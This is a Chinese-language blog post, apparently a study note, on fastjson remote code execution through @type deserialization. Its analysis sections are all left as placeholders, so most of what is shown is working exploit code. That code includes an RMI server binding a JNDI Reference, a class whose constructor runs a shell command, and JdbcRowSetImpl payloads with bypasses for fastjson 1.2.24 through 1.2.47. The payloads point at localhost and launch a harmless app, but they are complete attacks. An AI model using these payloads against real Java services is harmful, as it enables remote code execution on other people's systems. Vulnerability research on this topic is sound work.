---
categories: [""] 
tags: [""] 
title: "fastjson远程执行漏洞分析"
# linkTitle: ""
weight: 5
description: >
  
---



# 背景

阿里巴巴的fastjson作为java语言的json解析包，因为其易用性在国内被广泛应用。但是其安全性一直被诟病。因此，本文对其多次安全漏洞进行了分析总结。

# fastjson安全特性

fastjson存在一个特殊的key：@type。它可以指定将json字符串反序列化为value中指定的任意类。形如：

```json
{"@type":"com.xx.hello", "hello":"xx"}
```
能通过fastjson的JSON.parseObject方法反序列化为com.xx.Hello DTO类的一个实例对象。
而fastjson的诸多安全漏洞，都是围绕@type产生

# 漏洞案例

详细代码请参考：[java-demo fastjson](https://github.com/chnherb/java-demo/tree/master/src/main/java/com/huangbo/fastjson)

## 服务端代码

1、rmi server

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import lombok.Data;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class RmiFastJsonSafeServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
//        Reference reference = new javax.naming.Reference("com.huangbo.fastjson.Hello1", "com.huangbo.fastjson.Hello1", "http://127.0.0.1:1099/");
        Reference reference = new javax.naming.Reference("com.huangbo.fastjson.Hello", "com.huangbo.fastjson.Hello", "http://127.0.0.1:1099/");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
        registry.bind("hello", referenceWrapper);
    }
}
```
2、hello.java
```java
import lombok.Data;
@Data
public class Hello { // 这里需要为public才能调用到
    String hello;
    public Hello() {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c",
                    "/Applications/Calendar.app/Contents/MacOS/Calendar"});
        } catch (Exception e) {
        }
    }
}
```

## 1、本地调用示例

```java
// 1、这种调用方式不需要 hello 是public
String json = "{\"@type\": \"com.huangbo.fastjson.Hello\", \"hello\":\"hahaha\"}";
Object obj = JSON.parseObject(json);
System.out.println(obj);待补充
```
### 原理分析

待补充

## 2、远程调用示例

```java
//2、fastjson 1.2.24
//这种调用方式需要 hello 是public
String payload = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/hello\",\"autoCommit\":true}";
JSON.parse(payload);
```
### 原理分析

待补充

## 3、Lxx;漏洞

```java
// 3、fastjson 1.2.41
ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // 必须开启才能调用
String payload = "{\"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/hello\",\"autoCommit\":true}";
JSON.parse(payload);
```
### 原理分析

待补充

## 4、LLxx;;漏洞

```java
// 4、fastjson 1.2.42
ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // 必须开启才能调用
String payload = "{\"@type\": \"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/hello\",\"autoCommit\":true}";
JSON.parse(payload);
```
### 原理分析

待补充

## 5、[漏洞

```java
// 5、fastjson 1.2.43
ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // 必须开启才能调用
String payload = "{\"@type\": \"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://localhost:1099/hello\",\"autoCommit\":true]}";
JSON.parse(payload);
```
### 原理分析

待补充

## 6、缓存漏洞

```java
// 6、fastjson 1.2.47
String payload = "{" +
        "    \"a\":{" +
        "        \"@type\":\"java.lang.Class\"," +
        "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"" +
        "    }," +
        "    \"b\":{" +
        "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
        "        \"dataSourceName\":\"rmi://localhost:1099/hello\"," +
        "        \"autoCommit\":true" +
        "    }" +
        "}";
JSON.parse(payload);
```

### 原理分析

待补充


# Reference

[Fastjson 1.2.24反序列化漏洞分析](https://www.freebuf.com/vuls/178012.html)

[浅谈Fastjson RCE漏洞的绕过史](https://www.freebuf.com/vuls/208339.html)

[github fastjson远程执行poc](https://github.com/shengqi158/fastjson-remote-code-execute-poc)

[fastjson 远程反序列化poc的构造和分析](http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90)

[基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析](http://xxlegend.com/2018/10/23/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90)

[如何绕过高版本JDK限制进行JNDI注入利用](https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA)

[Fastjson 1.2.67版本刚刚发布即爆出严重漏洞](https://www.donews.com/news/detail/4/3086961.html)

[Spring IOC前世今生之JDNI](https://www.cnblogs.com/binarylei/p/12273010.html)

[JDNI注入学习](https://www.anquanke.com/post/id/233629)
